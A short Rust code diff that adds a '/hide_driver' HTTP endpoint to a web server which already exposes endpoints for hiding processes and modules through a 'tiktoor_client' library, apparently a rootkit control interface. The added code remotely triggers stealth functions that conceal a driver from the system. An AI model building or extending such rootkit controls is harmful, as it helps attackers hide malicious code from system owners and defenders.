@@ -19,6 +19,17 @@ struct HideProcessParameter {
     pid: u32,
 }
 
+#[derive(Deserialize)]
+struct HideDriverParameter {
+    rank: u32,
+}
+
+#[post("/hide_driver")]
+async fn hide_driver(parameter: web::Json<HideDriverParameter>) -> impl Responder {
+    tiktoor_client::hide_driver(parameter.rank);
+    HttpResponse::Ok()
+}
+
 #[post("/hide_process")]
 async fn hide_process(parameter: web::Json<HideProcessParameter>) -> impl Responder {
     tiktoor_client::hide_process(parameter.pid);
@@ -49,6 +60,7 @@ async fn main() -> std::io::Result<()> {
             .service(hide_process)
             .service(hide_module)
             .service(unhide_module)
+            .service(hide_driver)
     })
     .bind((cli.host, cli.port))?
     .run()
